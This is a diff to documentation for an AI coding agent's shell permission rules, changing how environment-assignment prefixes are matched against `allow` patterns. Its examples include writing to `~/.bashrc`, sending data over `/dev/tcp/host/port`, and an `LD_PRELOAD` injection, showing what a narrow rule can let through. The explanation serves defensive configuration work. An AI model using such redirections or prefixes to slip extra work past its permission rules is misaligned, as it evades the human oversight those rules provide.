@@ -130,13 +130,13 @@ Most tools use the literal `allow` / `ask` / `deny` meaning above, but a few orc
 
 > Permissions are Agent-level configuration, not a simple global switch.
 
-For `shell`, a specific `allow` pattern such as `"git *": allow` does not auto-allow a command that carries extra work: unquoted shell separators (`;`, `&&`, `||`, `|`, `&`, or newlines), command substitution (`$(...)` or backticks, including inside double quotes), process substitution (`<(...)` or `>(...)`, which spawns a subcommand of its own), and a quote the scan cannot resolve (an unterminated quote, or a trailing backslash). Those calls fall through to the next matching rule, typically `ask` or `deny`.
+For `shell`, a specific `allow` pattern such as `"git *": allow` does not auto-allow a command that carries extra work: unquoted shell separators (`;`, `&&`, `||`, `|`, `&`, or newlines), command substitution (`$(...)` or backticks, including inside double quotes), process substitution (`<(...)` or `>(...)`, which spawns a subcommand of its own), an environment assignment or declaration (`PATH=...`, `LD_PRELOAD=...`, or any other variable, and `export`/`declare`/`local` of the same, whether it prefixes the command or stands on its own line), and a quote the scan cannot resolve (an unterminated quote, or a trailing backslash). Those calls fall through to the next matching rule, typically `ask` or `deny`.
 
 Metacharacters that are literal payload (single-quoted, or escaped with a backslash) still match the narrow rule. Use this as a safety backstop, not as shell sandboxing; keep broad rules like `shell: allow` or `shell: { "*": allow }` for only fully trusted roles.
 
-A command-specific `allow` does, however, cover the full capability of that command, including output redirections and inline environment-assignment prefixes. If `echo *` is allowed, then `echo secret > ~/.bashrc`, `echo x >> file`, `data > /dev/tcp/host/port`, and `LD_PRELOAD=./x.so echo hi` are all allowed: the redirection target and the environment prefix are part of that single shell command, not a separate tool call, so they are not matched or gated on their own.
+A command-specific `allow` does, however, cover the full capability of that command, including output redirections. If `echo *` is allowed, then `echo secret > ~/.bashrc`, `echo x >> file`, and `data > /dev/tcp/host/port` are all allowed: the redirection target is part of the same command text, not a separate tool call, so it is not matched or gated on its own. An environment-assignment prefix is different: `LD_PRELOAD=./x.so echo hi` is matched as the whole `LD_PRELOAD=... echo hi` text, so it falls through to the next matching rule instead of riding on `echo *`. A rule written for the command's own text still decides the outcome: an assignment that keeps a narrow `allow` from matching cannot push a denied command into a broader rule, nor let a narrow `ask` fall through to a broad `allow`.
 
-Grant a command-level `allow` only to commands whose worst case (arbitrary file writes via redirection, an overridden environment) you accept; otherwise keep them at `ask`.
+Grant a command-level `allow` only to commands whose worst case (arbitrary file writes via redirection) you accept; otherwise keep them at `ask`.
 
 ## Shell / shell risk
 
